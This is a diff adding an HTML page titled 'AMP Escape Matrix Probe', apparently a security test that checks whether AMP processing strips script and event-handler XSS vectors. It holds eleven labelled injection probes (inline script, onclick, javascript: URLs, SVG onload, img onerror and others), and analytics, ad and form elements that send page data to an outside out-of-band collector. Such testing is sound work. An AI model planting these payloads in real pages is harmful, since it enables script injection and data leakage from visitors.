@@ -1,0 +1,83 @@
+<!doctype html>
+<html ⚡ lang="en">
+<head>
+<meta charset="utf-8">
+<title>AMP Escape Matrix Probe</title>
+<link rel="canonical" href="https://ithrael.github.io/amp-sec-test/amp-test.html">
+<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
+<style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
+<script async src="https://cdn.ampproject.org/v0.js"></script>
+<script async custom-element="amp-analytics" src="https://cdn.ampproject.org/v0/amp-analytics-0.1.js"></script>
+<script async custom-element="amp-list" src="https://cdn.ampproject.org/v0/amp-list-0.1.js"></script>
+<script async custom-template="amp-mustache" src="https://cdn.ampproject.org/v0/amp-mustache-0.2.js"></script>
+<script async custom-element="amp-bind" src="https://cdn.ampproject.org/v0/amp-bind-0.1.js"></script>
+<script async custom-element="amp-ad" src="https://cdn.ampproject.org/v0/amp-ad-0.1.js"></script>
+<script async custom-element="amp-iframe" src="https://cdn.ampproject.org/v0/amp-iframe-0.1.js"></script>
+<script type="application/ld+json">{"@context":"http://schema.org","@type":"Article","headline":"AMP ESCAPE PROBE <script>alert(1)</script>"}</script>
+<!-- T1: inline custom JS (must be stripped by rewriter) -->
+<script>window.__AMP_PROBE_INLINE__ = "XSS-T1-INLINE-JS"; console.log("XSS-T1");</script>
+<!-- T2: event handler injection -->
+<button onclick="console.log('XSS-T2-ONCLICK')">T2 onclick probe</button>
+<!-- T3: javascript: URL -->
+<a href="javascript:console.log('XSS-T3-JSURL')" id="t3">T3 javascript: url probe</a>
+<!-- T4: SVG event -->
+<svg xmlns="http://www.w3.org/2000/svg"><rect onload="console.log('XSS-T4-SVG')" width="10" height="10"/></svg>
+<!-- T5: meta refresh injection -->
+<meta http-equiv="refresh" content="0;url=https://ithrael.github.io/amp-sec-test/landed.html">
+<!-- T6: iframe injection -->
+<iframe src="https://ithrael.github.io/amp-sec-test/frame.html"></iframe>
+<!-- T7: link rel=import/preload abuse -->
+<link rel="import" href="https://ithrael.github.io/amp-sec-test/import.html">
+<style>body:after{content:"XSS-T8-CSS"};@import url("https://ithrael.github.io/amp-sec-test/x.css");</style>
+<!-- T9: img onerror -->
+<img src="https://ithrael.github.io/amp-sec-test/broken.gif" onerror="console.log('XSS-T9-IMGERR')" alt="t9">
+<!-- T10: form action javascript -->
+<form action="javascript:console.log('XSS-T10-FORM')"><input type="submit" value="t10"></form>
+<!-- T11: attribute breakout attempt in comment --><div title="x" onmouseover="console.log('XSS-T11-MOUSEOVER')">t11</div>
+</head>
+<body>
+<h1 id="probe-root">AMP-TESTPAGE-V1</h1>
+
+<!-- V1: amp-analytics remote config pointing at OOB collector -->
+<amp-analytics>
+<script type="application/json">
+{
+  "requests": {
+    "oobPing": "https://api.anyongtech.cn/ws-oob/cb/ampprobe1/ping?title=${title}&url=${canonicalUrl}&r=${random}"
+  },
+  "triggers": {
+    "pageLoad": {
+      "on": "visible",
+      "request": "oobPing"
+    }
+  }
+}
+</script>
+</amp-analytics>
+
+<!-- V2: amp-analytics remote config fetch (config=URL) -->
+<amp-analytics config="https://api.anyongtech.cn/ws-oob/cb/ampprobe1/analytics-config.json">
+<script type="application/json">{"vars":{"accountId":"probe-v2"}}</script>
+</amp-analytics>
+
+<!-- V3: amp-list fetching JSON from my origin + mustache template -->
+<amp-list src="https://ithrael.github.io/amp-sec-test/list.json" layout="fixed-height" height="100">
+  <template type="amp-mustache">
+    <div>item: {{item}}</div>
+    <div onclick="console.log('XSS-V3-TEMPLATE-ONCLICK')">{{htmlProbe}}</div>
+    <a href="{{linkProbe}}">v3 link</a>
+  </template>
+</amp-list>
+
+<!-- V4: amp-iframe to sandbox origin probe -->
+<amp-iframe src="https://ithrael.github.io/amp-sec-test/frame.html" width="200" height="100" sandbox="allow-scripts allow-same-origin allow-popups allow-forms" layout="responsive"></amp-iframe>
+
+<!-- V5: amp-ad custom type -->
+<amp-ad width="300" height="250" type="probe-custom" data-url="https://api.anyongtech.cn/ws-oob/cb/ampprobe1/ad"></amp-ad>
+
+<!-- V6: form POST action probe -->
+<form method="post" action-xhr="https://api.anyongtech.cn/ws-oob/cb/ampprobe1/form-post" target="_top"><input type="text" name="q"><input type="submit" value="v6"></form>
+
+<p id="notes">canonical-check: https://ithrael.github.io/amp-sec-test/amp-test.html</p>
+</body>
+</html>
